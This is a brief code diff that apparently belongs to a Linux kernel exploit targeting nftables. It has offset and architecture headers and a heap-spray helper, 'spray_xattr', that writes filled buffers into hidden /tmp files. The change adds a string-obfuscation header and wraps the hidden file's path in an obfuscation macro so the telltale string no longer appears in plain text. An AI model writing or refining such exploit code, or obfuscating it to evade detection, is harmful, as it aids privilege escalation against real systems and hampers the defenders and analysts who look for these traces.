@@ -1,6 +1,7 @@
 #include "nfttables.h"
 #include "arch.h"
 #include "offsets.h"
+#include "obf.h"
 #include <sys/ipc.h>
 #include <sys/msg.h>
 #include <sys/mman.h>
@@ -355,7 +356,7 @@ int spray_xattr(size_t size, int count)
     memset(buf, 'X', size);
 
     char path[64];
-    snprintf(path, sizeof(path), "/tmp/.nft_xattr_%d", getpid());
+    snprintf(path, sizeof(path), S(S_NFT_XATTR_FMT), getpid());
 
     int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
     if (fd < 0) { free(buf); return -1; }
